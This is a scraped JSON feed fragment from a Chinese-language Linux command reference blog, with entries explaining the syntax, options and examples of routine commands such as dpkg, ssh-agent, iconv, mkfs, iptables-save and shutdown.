Q：source和sh在执行文件方面有什么区别？ A：sh的执行是在子 shell 中，source会使得被执行文件的变量及函数加载进当前终端环境内（除去函数内 local 修饰的变量等）；建议您参考export命令的 知识点 部分 注意 该命令是 bash 内建命令，相关的帮助信息请查看 help 命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"source","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/source/","stats":{"text":"2 min read","time":65000,"words":293,"minutes":2},"date":"2022-02-01 22:13:09","dateFormat":"2022-02-01"},{"content":"Debian Linux 中创建并管理一个转向列表。 补充说明 dpkg-divert 命令是 Debian Linux 中创建并管理一个转向（diversion）列表，其使得安装文件的默认位置失效的工具。 语法 dpkg-divert (选项) (参数) 选项 --add：添加一个转移文件； --remove：删除一个转移文件； --list：列出匹配的转移； --truename：对应转移文件真实文件名； --quidet：安静模式。 参数 文件：指定转移文件名。 实例 指定软件包 wibble 安装时，写入/usr/bin/example.foo，而不是/usr/bin/example： dpkg-divert --package wibble --divert /usr/bin/example.foo --rename /usr/bin/example 指定软件包 wibble 安装时，删除对/usr/bin/example的转移修改： dpkg-divert --package wibble --rename --remove /usr/bin/example 删除对/usr/bin/example的转移修改： dpkg-divert --rename --remove /usr/bin/example 添加一个软件包安装时，写入/usr/bin/example.foo，而不是/usr/bin/example的修改： dpkg-divert --divert /usr/bin/example.foo --rename /usr/bin/example ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dpkg-divert","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dpkg-divert/","stats":{"text":"2 min read","time":60000,"words":238,"minutes":2},"date":"2022-02-01 22:12:54","dateFormat":"2022-02-01"},{"content":"命令查找文件或目录。 补充说明 slocate 命令是一个命令查找文件或目录。slocate 本身具有一个数据库，里面存放了系统中文件与目录的相关信息。 语法 slocate [-u][--help][--version][-d &lt;目录&gt;][查找的文件 ] 选项 -d&lt;目录&gt;或--database=&lt;目录&gt; 指定数据库所在的目录。 -u 更新slocate数据库。 --help 显示帮助。 --version 显示版本信息。 实例 使用指令&quot;slocate&quot;显示文件名中含有关键字&quot;fdisk&quot;的文件路径信息，输入如下命令： $ slocate fdisk #显示文件名中含有 fdisk 关键字的文件的路径信息 执行以上命令后，指令执行的输出信息如下： $ slocate fdisk #显示文件名中含有fdisk 关键字的文件的路径信息 /root/cfdisk #搜索到的文件路径列表 /root/fdisk /root/sfdisk /usr/include/grub/ieee1275/ofdisk.h /usr/share/doc/util-Linux/README.cfdisk /usr/share/doc/util-Linux/README.fdisk.gz /usr/share/doc/util-Linux/examples/sfdisk.examples.gz ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"slocate","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/slocate/","stats":{"text":"2 min read","time":63000,"words":258,"minutes":2},"date":"2022-02-01 22:12:27","dateFormat":"2022-02-01"},{"content":"扫描系统中所有硬盘的物理卷列表。 补充说明 pvscan 命令会扫描系统中连接的所有硬盘，列出找到的物理卷列表。使用 pvscan 命令的-n选项可以显示硬盘中的不属于任何卷组的物理卷，这些物理卷是未被使用的。 语法 pvscan (选项) 选项 -d：调试模式； -e：仅显示属于输出卷组的物理卷； -n：仅显示不属于任何卷组的物理卷； -s：短格式输出； -u：显示 UUID。 实例 使用 pvscan 命令扫描当前系统中所有硬盘的物理卷，在命令行中输入下面的命令： [root@localhost ~]# pvscan #扫描所有硬盘上的物理卷 输出信息如下： PV /dev/sdb1 lvm2 [101.94 MB] PV /dev/sdb2 lvm2 [101.98 MB] Total: 2 [203.92 MB] / in use: 0 [0 ] / in no VG: 2 [203.92 MB] 说明：本例中，输出了两个物理卷，它们不属于任何卷组，是可被利用的物理卷。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pvscan","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pvscan/","stats":{"text":"1 min read","time":57000,"words":250,"minutes":1},"date":"2022-02-01 22:12:07","dateFormat":"2022-02-01"},{"content":"列出 NFS 客户端和服务器的工作状态。 补充说明 nfsstat 命令用于列出 NFS 客户端和服务器的工作状态。 语法 nfsstat(选项) 选项 -s：仅列出NFS服务器端状态； -c：仅列出NFS客户端状态； -n：仅列出NFS状态，默认显示nfs客户端和服务器的状态； -2：仅列出NFS版本2的状态； -3：仅列出NFS版本3的状态； -4：仅列出NFS版本4的状态； -m：打印以加载的nfs文件系统状态； -r：仅打印rpc状态。 实例 要显示关于客户机发送和拒绝的 RPC 和 NFS 调用数目的信息，输入： nfsstat -c 要显示和打印与客户机 NFS 调用相关的信息，输入如下命令： nfsstat -cn 要显示和打印客户机和服务器的与 RPC 调用相关的信息，输入如下命令： nfsstat -r 要显示关于服务器接收和拒绝的 RPC 和 NFS 调用数目的信息，输入如下命令： nfsstat –s ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"nfsstat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/nfsstat/","stats":{"text":"1 min read","time":57000,"words":259,"minutes":1},"date":"2022-02-01 22:09:32","dateFormat":"2022-02-01"},{"content":"调用并执行指定的命令。 补充说明 exec 命令用于调用并执行指令的命令。exec 命令通常用在 shell 脚本程序中，可以调用其他的命令。如果在当前终端中使用命令，则当指定的命令执行完毕后会立即退出终端。 语法 exec (选项) (参数) 选项 -c：在空环境中执行指定的命令。 参数 指令：要执行的指令和相应的参数。 实例 首先使用 echo 命令将文本“Linux C++”进行输出，输入如下命令： echo Linux C++ # 输出指定信息 执行上面的指令后，输出如下信息： Linux C++ # 输出信息 然后再使用 exec 命令调用 echo 命令输出同样的信息，并且对输出的信息进行对比，输入指令如下所示： exec -c echo Linux C++ # 调用命令 执行以上命令后，其输出信息如下： Linux C++ # 使用指定指令输出信息 通过比较两者执行后的结果来看，所实现的功能是相同的，即使用 exec 命令调用 echo 命令成功。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"exec","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/exec/","stats":{"text":"2 min read","time":61000,"words":285,"minutes":2},"date":"2022-02-01 22:09:17","dateFormat":"2022-02-01"},{"content":"显示目前登入系统的用户信息。 补充说明 w 命令用于显示已经登陆系统的用户列表，并显示用户正在执行的指令。执行这个命令可得知目前登入系统的用户有那些人，以及他们正在执行的程序。单独执行 w 命令会显示所有的用户，您也可指定用户名称，仅显示某位用户的相关信息。 语法 w (选项) (参数) 选项 -h, --no-header 不打印头信息； -u, --no-current 当显示当前进程和cpu时间时忽略用户名； -s, --short 使用短输出格式； -f, --from 显示用户从哪登录； -o, --old-style 老式输出 -i, --ip-addr 显示IP地址而不是主机名（如果可能） --help 显示此帮助并退出 -V, --version 显示版本信息。 参数 用户：仅显示指定用户。 实例 w 20:39:37 up 136 days, 3:58, 1 user, load average: 0.00, 0.00, 0.00 USER TTY FROM login@ IDLE JCPU PCPU WHAT root pts/0 222.94.97.122 20:39 1.00s 0.00s 0.00s w ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"w","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/w/","stats":{"text":"2 min read","time":65000,"words":271,"minutes":2},"date":"2022-02-01 22:08:55","dateFormat":"2022-02-01"},{"content":"创建新的空文件。 补充说明 touch 命令有两个功能：一是用于把已存在文件的时间标签更新为系统当前的时间（默认方式），它们的数据将原封不动地保留下来； 二是用来创建新的空文件。 语法 touch (选项) (参数) 选项 -a：或--time=atime 或--time=access 或--time=use 只更改存取时间； -c：或--no-create 不建立任何文件； -d：&lt;时间日期&gt; 使用指定的日期时间，而非现在的时间； -f：此参数将忽略不予处理，仅负责解决 BSD 版本 touch 指令的兼容性问题； -m：或--time=mtime 或--time=modify 只更该变动时间； -r：&lt;参考文件或目录&gt; 把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同； -t：&lt;日期时间&gt; 使用指定的日期时间，而非现在的时间； --help：在线帮助； --version：显示版本信息。 参数 文件：指定要设置时间属性的文件列表。 实例 touch ex2 在当前目录下建立一个空文件 ex2，然后，利用ls -l命令可以发现文件 ex2 的大小为 0，表示它是空文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"touch","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/touch/","stats":{"text":"2 min read","time":69000,"words":316,"minutes":2},"date":"2022-02-01 22:08:42","dateFormat":"2022-02-01"},{"content":"Debian Linux 系统上安装、创建和管理软件包。 补充说明 dpkg 命令是 Debian Linux 系统用来安装、创建和管理软件包的实用工具。 语法 dpkg (选项) (参数) 选项 -i：安装软件包； -r：删除软件包； -P：删除软件包的同时删除其配置文件； -L：显示于软件包关联的文件； -l：显示已安装软件包列表； --unpack：解开软件包； -c：显示软件包内文件列表； --confiugre：配置软件包。 参数 Deb 软件包：指定要操作的.deb 软件包。 实例 dpkg -i package.deb # 安装包 dpkg -r package # 删除包 dpkg -P package # 删除包（包括配置文件） dpkg -L package # 列出与该包关联的文件 dpkg -l package # 显示该包的版本 dpkg --unpack package.deb # 解开deb包的内容 dpkg -S keyword # 搜索所属的包内容 dpkg -l # 列出当前已安装的包 dpkg -c package.deb # 列出deb包的内容 dpkg --configure package # 配置包 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dpkg","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dpkg/","stats":{"text":"1 min read","time":57000,"words":243,"minutes":1},"date":"2022-02-01 22:08:20","dateFormat":"2022-02-01"},{"content":"ssh 密钥管理器。 补充说明 ssh-agent 命令是一种控制用来保存公钥身份验证所使用的私钥的程序。ssh-agent 在 X 会话或登录会话之初启动，所有其他窗口或程序则以客户端程序的身份启动并加入到 ssh-agent 程序中。通过使用环境变量，可定位代理并在登录到其他使用 ssh 机器上时使用代理自动进行身份验证。 其实 ssh-agent 就是一个密钥管理器，运行 ssh-agent 以后，使用 ssh-add 将私钥交给 ssh-agent 保管，其他程序需要身份验证的时候可以将验证申请交给 ssh-agent 来完成整个认证过程。 语法 ssh-agent [-c | -s] [-d] [-a bind_address] [-t life] [command [arg ...]] ssh-agent [-c | -s] -k 选项 -a bind_address：bind the agent to the UNIX-domain socket bind_address. -c：生成C-shell风格的命令输出。 -d：调试模式。 -k：把ssh-agent进程杀掉。 -s：生成Bourne shell 风格的命令输出。 -t life：设置默认值添加到代理人的身份最大寿命。 实例 运行 ssh-agent： ssh-agent 运行 ssh-agent，它会打印出来它使用的环境和变量。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ssh-agent","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ssh-agent/","stats":{"text":"2 min read","time":71000,"words":302,"minutes":2},"date":"2022-02-01 22:07:58","dateFormat":"2022-02-01"},{"content":"转换文件的编码方式。 补充说明 iconv 命令是用来转换文件的编码方式的，比如它可以将 UTF8 编码的转换成 GB18030 的编码，反过来也行。JDK 中也提供了类似的工具 native2ascii。Linux 下的 iconv 开发库包括 iconv_open,iconv_close,iconv 等 C 函数，可以用来在 C/C++程序中很方便的转换字符编码，这在抓取网页的程序中很有用处，而 iconv 命令在调试此类程序时用得着。 语法 iconv -f encoding [-t encoding] [inputfile]... 选项 -f encoding :把字符从encoding编码开始转换。 -t encoding :把字符转换到encoding编码。 -l :列出已知的编码字符集合 -o file :指定输出文件 -c :忽略输出的非法字符 -s :禁止警告信息，但不是错误信息 --verbose :显示进度信息 -f和-t所能指定的合法字符在-l选项的命令里面都列出来了。 实例 列出当前支持的字符编码： iconv -l 将文件 file1 转码，转后文件输出到 fil2 中： iconv file1 -f EUC-JP-MS -t UTF-8 -o file2 这里，没-o那么会输出到标准输出。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"iconv","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/iconv/","stats":{"text":"2 min read","time":67000,"words":294,"minutes":2},"date":"2022-02-01 22:07:36","dateFormat":"2022-02-01"},{"content":"Debian Linux 下的软件包管理工具。 补充说明 dpkg-deb 命令是 Debian Linux 下的软件包管理工具，它可以对软件包执行打包和解包操作以及提供软件包信息。 语法 dpkg-deb (选项) (参数) 选项 -c：显示软件包中的文件列表； -e：将主控信息解压； -f：把字段内容打印到标准输出； -x：将软件包中的文件释放到指定目录下； -X：将软件包中的文件释放到指定目录下，并显示释放文件的详细过程； -w：显示软件包的信息； -l：显示软件包的详细信息； -R：提取控制信息和存档的清单文件； -b：创建 debian 软件包。 参数 文件：指定要操作的“.deb”软件包的全名或软件名。 实例 解压程序文件： dpkg-deb -x drcom-pum_1.0-0ubuntu1~ppa1~jaunty1_i386.deb drcom 解压控制文件： dpkg-deb -e drcom-pum_1.0-0ubuntu1~ppa1~jaunty1_i386.deb drcom/DEBIAN 打包生成 deb 文件： dpkg-deb -b drcom drcom_1.4.8.2_i386.deb 查询 deb 包中的文件内容： dpkg-deb -c demo.deb ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dpkg-deb","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dpkg-deb/","stats":{"text":"2 min read","time":65000,"words":276,"minutes":2},"date":"2022-02-01 22:07:18","dateFormat":"2022-02-01"},{"content":"从当前正在运行的内核引导到一个新内核。 补充说明 kexec 命令是 Linux 内核的一个补丁，让您可以从当前正在运行的内核直接引导到一个新内核。在上面描述的引导序列中，kexec 跳过了整个引导装载程序阶段（第一部分）并直接跳转到我们希望引导到的内核。不再有硬件的重启，不再有固件操作，不再涉及引导装载程序。完全避开了引导序列中最弱的一环 -- 固件。这一功能部件带来的最大益处在于，系统现在可以极其快速地重新启动。 kexec 的好处： 要求高可用性的系统，以及需要不断重新启动系统的内核开发人员，都将受益于 kexec。因为 kexec 跳过了系统重新启动过程中最耗时的部分（也就是固件初始化硬件设备的阶段），所以重新启动变得非常快，可用性得到了提高。 语法 kexec (选项) 选项 -l：指定内核映像文件； -e：允许当前被加载的内核； -f：强制立即调用系统调用“kexec”，而不调用“shutdown”； -t：指定新内核的类型； -u：卸载当前的 kexec 目标内核。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"kexec","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/kexec/","stats":{"text":"2 min read","time":69000,"words":332,"minutes":2},"date":"2022-02-01 22:05:14","dateFormat":"2022-02-01"},{"content":"显示和编辑被用于连接 X 服务器的认证信息。 补充说明 xauth 命令用于显示和编辑被用于连接 X 服务器的认证信息。 语法 xauth (选项) (参数) 选项 -f：不使用默认的认证文件，而使用指定的认证文件； -q：安静模式，不打印未请求的状态信息； -v：详细模式，打印指定的各种操作信息； -i：忽略认证文件锁定； -b：执行任何操作，终端认证文件锁定。 参数 add：添加认证条目到认证文件中； extract：将指定的设备内容加入到指定的密码文件中； info：显示授权文件相关信息； exit：退出交互模式； list：列出给定的显示设备的内容； merge：合并多个授权文件内容； extract：将指定设备内容写入指定的授权文件； nextrct：将指定设备内容写入指定的授权文件； nmerge：合并多个授权文件内容； remove：删除指定显示设备的授权条目； source：从指定文件读取包含xauth的内容指令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"xauth","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/xauth/","stats":{"text":"2 min read","time":60000,"words":285,"minutes":2},"date":"2022-02-01 22:04:46","dateFormat":"2022-02-01"},{"content":"Debian Linux 中重新配制一个已经安装的软件包。 补充说明 dpkg-reconfigure 命令是 Debian Linux 中重新配置已经安装过的软件包，可以将一个或者多个已安装的软件包传递给此指令，它将询问软件初次安装后的配置问题。 当用户需要再次对软件包配置的时候，可以使用 dpkg-reconfigure 命令来对指定的软件包进行配置。 语法 dpkg-reconfigure (选项) (参数) 选项 -a：重新配置所有的软件包； -u 或--unseen-only：仅显示未提过的问题； --default-priority：使用默认优先级，而非“低”级； --force：强制执行操作，需谨慎使用此选项； --no-reload：不要轻易的重装模板（使用时请慎重考虑）； -f 或--frontend：指定 debconf 前端界面； -p 或--priority：指定要显示的问题的最优先级； --terse：开启简要模式。 参数 软件包名：需要重新配置的已安装的软件包。 实例 用于配置语言： sudo dpkg-reconfigure locales ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dpkg-reconfigure","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dpkg-reconfigure/","stats":{"text":"1 min read","time":57000,"words":262,"minutes":1},"date":"2022-02-01 22:04:33","dateFormat":"2022-02-01"},{"content":"GNU 的工程化编译工具。 补充说明 make 命令是 GNU 的工程化编译工具，用于编译众多相互关联的源代码文件，以实现工程化的管理，提高开发效率。 语法 make (选项) (参数) 选项 -f：指定“makefile”文件； -i：忽略命令执行返回的出错信息； -s：沉默模式，在执行之前不输出相应的命令行信息； -r：禁止使用 build-in 规则； -n：非执行模式，输出所有执行命令，但并不执行； -t：更新目标文件； -q：make 操作将根据目标文件是否已经更新返回&quot;0&quot;或非&quot;0&quot;的状态信息； -p：输出所有宏定义和目标文件描述； -d：Debug 模式，输出有关文件和检测时间的详细信息。 Linux 下常用选项与 Unix 系统中稍有不同，下面是不同的部分： -c dir：在读取 makefile 之前改变到指定的目录 dir； -I dir：当包含其他 makefile 文件时，利用该选项指定搜索目录； -h：help 文挡，显示所有的 make 选项； -w：在处理 makefile 之前和之后，都显示工作目录。 参数 目标：指定编译目标。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"make","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/make/","stats":{"text":"2 min read","time":68000,"words":310,"minutes":2},"date":"2022-02-01 22:04:09","dateFormat":"2022-02-01"},{"content":"在新的会话中运行程序。 补充说明 setsid 命令子进程从父进程继承了：SessionID、进程组 ID 和打开的终端。子进程如果要脱离这些，代码中可通过调用 setsid 来实现。，而命令行或脚本中可以通过使用命令 setsid 来运行程序实现。setsid 帮助一个进程脱离从父进程继承而来的已打开的终端、隶属进程组和隶属的会话。 语法 setsid[options] &lt;program&gt; [arguments ...] 选项 -c, --ctty 将控制终端设置为当前控制终端 -f, --fork 总是 fork -w, --wait 等待程序退出，并使用相同的返回 实例 可见 setsid 的使用也是非常方便的，也只需在要处理的命令前加上 setsid 即可 [root@root ~]# setsid ping www.example.com [root@root ~]# ps -ef |grep www.example.com root 31094 1 0 07:28 ? 00:00:00 ping www.example.com root 31102 29217 0 07:29 pts/4 00:00:00 grep www.example.com [root@root ~]# ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"setsid","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/setsid/","stats":{"text":"1 min read","time":59000,"words":242,"minutes":1},"date":"2022-02-01 22:02:31","dateFormat":"2022-02-01"},{"content":"从运行的内核中移除指定的内核模块。 补充说明 rmmod 命令用于从当前运行的内核中移除指定的内核模块。执行 rmmod 指令，可删除不需要的模块。Linux 操作系统的核心具有模块化的特性，应此在编译核心时，务须把全部的功能都放如核心。你可以将这些功能编译成一个个单独的模块，待有需要时再分别载入它们。 语法 rmmod (选项) (参数) 选项 -v：显示指令执行的详细信息； -f：强制移除模块，使用此选项比较危险； -w：等待着，直到模块能够被除时在移除模块； -s：向系统日志（syslog）发送错误信息。 参数 模块名：要移除的模块名称。 实例 用 rmmod 命令主要用于卸载正在使用的 Linux 内核模块，与modprobe -r命令相似，如下所示： [root@localhost boot]# lsmod | grep raid1 raid1 25153 0 [root@localhost boot]# rmmod raid1 [root@localhost boot]# lsmod | grep raid1 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rmmod","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rmmod/","stats":{"text":"1 min read","time":57000,"words":259,"minutes":1},"date":"2022-02-01 22:02:08","dateFormat":"2022-02-01"},{"content":"用来开启群组的投影密码。 补充说明 grpconv 命令用来开启群组的投影密码。Linux 系统里的用户和群组密码，分别存放在/etc目录下的 passwd 和 group 文件中。因系统运作所需，任何人都得以读取它们，造成安全上的破绽。投影密码将文件内的密码改存在/etc目录下的 shadow 和 gshadow 文件内，只允许系统管理者读取，同时把原密码置换为&quot;x&quot;字符。投影密码的功能可随时开启或关闭，您只需执行 grpconv 指令就能开启群组投影密码。 语法 grpconv 实例 设置 cdy 组密码 groupmod --password 123456 cdy cat /etc/group | grep cdy cdy:123456:1000: # 看出密码是123456 启动影子系统 grpconv cat /etc/group | grep cdy cdy:x:1000: # 看出密码段已经被x替代 cat /etc/gshadow | grep cdy cdy:123456:: # 已经移到影子文件了 注：gshadow, shadow 只有 root 权限才可以查看。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"grpconv","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/grpconv/","stats":{"text":"1 min read","time":57000,"words":248,"minutes":1},"date":"2022-02-01 22:00:50","dateFormat":"2022-02-01"},{"content":"挂起 shell 的执行。。 概要 suspend [-f] 主要用途 挂起 shell 的执行，直到收到SIGCONT信号。 除非使用-f选项，否则无法对login shell使用。 选项 -f 对 login shell 执行挂起操作。 返回值 返回成功除非未开启作业控制或发生了错误。 例子 # 打开一个终端，首先获取PID。 echo $$ # 执行挂起命令 suspend # 再打开一个终端，发送SIGCONT命令 kill -s SIGCONT PID # 此时之前的终端结束挂起状态，可以正常交互。 注意 bash的作业控制命令包括bg fg kill wait disown suspend。 该命令需要set选项monitor处于开启状态时才能执行； 查看作业控制状态：输入set -o查看monitor行； 执行set -o monitor或set -m开启该选项。 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"suspend","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/suspend/","stats":{"text":"1 min read","time":49000,"words":218,"minutes":1},"date":"2022-02-01 21:59:48","dateFormat":"2022-02-01"},{"content":"备份 iptables 的表配置。 补充说明 iptables-save 命令用于将 linux 内核中的 iptables 表导出到标准输出设备商，通常，使用 shell 中 I/O 重定向功能将其输出保存到指定文件中。 语法 iptables-save (选项) 选项 -c：指定要保存的 iptables 表时，保存当权的数据包计算器和字节计数器的值； -t：指定要保存的表的名称。 实例 [root@localhost ~]# iptables-save -t filter &gt; iptables.bak [root@localhost ~]# cat iptables.bak # Generated by iptables-save v1.3.5 on Thu Dec 26 21:25:15 2013 *filter :INPUT DROP [48113:2690676] :FORWARD accept [0:0] :OUTPUT ACCEPT [3381959:1818595115] -A INPUT -i lo -j ACCEPT -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A INPUT -p icmp -j ACCEPT -A OUTPUT -o lo -j ACCEPT COMMIT ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"iptables-save","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/iptables-save/","stats":{"text":"1 min read","time":58000,"words":200,"minutes":1},"date":"2022-02-01 21:58:23","dateFormat":"2022-02-01"},{"content":"可建立目前系统的启动盘。 补充说明 mkbootdisk 命令用来为当前运行的系统创建能够单独使用的系统引导软盘，以便在系统出现故障时能够启动操作进行适当的修复工作。 语法 mkbootdisk (选项) (参数) 选项 --device&lt;设备&gt;：指定设备； --mkinitrdargs&lt;参数&gt;：设置 mkinitrd 的参数； --noprompt：不会提示用户插入磁盘； --verbose：执行时显示详细的信息； --version：显示版本信息。 参数 内核：指定内核版本。 实例 mkbootdisk --device /dev/fd0 `uname -r` 其中，uname -r是目前 Linux 系统所使用的核心版本，如果你有多个核心版本的话，你以可以直接输入核心版本。例如在这个网页中所使用的核心有两个版本，一个是 2.2.12-20，另一个是 2.2.18，若要以 2.2.18 设定开机的话，可以使用： mkbootdisk --device /dev/fd0 2.2.18 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mkbootdisk","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mkbootdisk/","stats":{"text":"1 min read","time":55000,"words":242,"minutes":1},"date":"2022-02-01 21:57:46","dateFormat":"2022-02-01"},{"content":"单行纯文本编辑器。 补充说明 ed 命令是单行纯文本编辑器，它有命令模式（command mode）和输入模式（input mode）两种工作模式。ed 命令支持多个内置命令，常见内置命令如下： 语法 ed (选项) (参数) 选项 A # 切换到输入模式，在文件的最后一行之后输入新的内容； C # 切换到输入模式，用输入的内容替换掉最后一行的内容； i # 切换到输入模式，在当前行之前加入一个新的空行来输入内容； d # 用于删除最后一行文本内容； n # 用于显示最后一行的行号和内容； w # &lt;文件名&gt;：一给定的文件名保存当前正在编辑的文件； q # 退出 ed 编辑器。 -G 或——traditional：提供兼容的功能； -p&lt;字符串&gt;：指定 ed 在 command mode 的提示字符； -s，-，--quiet 或——silent：不执行开启文件时的检查功能； --help：显示帮助； --version：显示版本信息。 参数 文件：待编辑的文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ed","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ed/","stats":{"text":"1 min read","time":59000,"words":273,"minutes":1},"date":"2022-02-01 21:57:30","dateFormat":"2022-02-01"},{"content":"收缩逻辑卷空间。 补充说明 lvreduce 命令用于减少 LVM 逻辑卷占用的空间大小。使用 lvreduce 命令收缩逻辑卷的空间大小有可能会删除逻辑卷上已有的数据，所以在操作前必须进行确认。 语法 lvreduce (选项) (参数) 选项 -L：指定逻辑卷的大小，单位为“kKmMgGtT”字节； -l：指定逻辑卷的大小（LE 数）。 参数 逻辑卷：指定要操作的逻辑卷对应的设备文件。 实例 使用 lvreduce 命令减少指定的逻辑卷的空间大小。在命令行中输入下面的命令： [root@localhost ~]# lvreduce -L -50M /dev/vg1000/lvol0 #将逻辑卷的空间大小减少 50M 输出信息如下： ......省略部分输出内容...... Do you really want to reduce lvol0? [y/n]: y #确认操作 Reducing logical volume lvol0 to 252.00 MB Logical volume lvol0 successfully resized ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lvreduce","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lvreduce/","stats":{"text":"1 min read","time":51000,"words":220,"minutes":1},"date":"2022-02-01 21:57:06","dateFormat":"2022-02-01"},{"content":"用于在设备上创建 Linux 文件系统。 补充说明 mkfs 命令用于在设备上（通常为硬盘）创建 Linux 文件系统。mkfs 本身并不执行建立文件系统的工作，而是去调用相关的程序来执行。 语法 mkfs (选项) (参数) 选项 fs：指定建立文件系统时的参数； -t&lt;文件系统类型&gt;：指定要建立何种文件系统； -v：显示版本信息与详细的使用方法； -V：显示简要的使用方法； -c：在制做档案系统前，检查该 partition 是否有坏轨。 参数 文件系统：指定要创建的文件系统对应的设备文件名； 块数：指定文件系统的磁盘块数。 实例 在/dev/hda5上建一个 msdos 的档案系统，同时检查是否有坏轨存在，并且将过程详细列出来： mkfs -V -t msdos -c /dev/hda5 mkfs -t ext3 /dev/sda6 //将sda6分区格式化为ext3格式 mkfs -t ext2 /dev/sda7 //将sda7分区格式化为ext2格式 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mkfs","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mkfs/","stats":{"text":"1 min read","time":58000,"words":262,"minutes":1},"date":"2022-02-01 21:56:41","dateFormat":"2022-02-01"},{"content":"用来执行系统关机的命令。 补充说明 shutdown 命令用来系统关机命令。shutdown 指令可以关闭所有程序，并依用户的需要，进行重新开机或关机的动作。 语法 shutdown (选项) (参数) 选项 -c：当执行“shutdown -h 11:50”指令时，只要按+键就可以中断关机的指令； -f：重新启动时不执行 fsck； -F：重新启动时执行 fsck； -h：将系统关机； -k：只是送出信息给所有用户，但不会实际关机； -n：不调用 init 程序进行关机，而由 shutdown 自己进行； -r：shutdown 之后重新启动； -t&lt;秒数&gt;：送出警告信息和删除信息之间要延迟多少秒。 参数 [时间]：设置多久时间后执行 shutdown 指令； 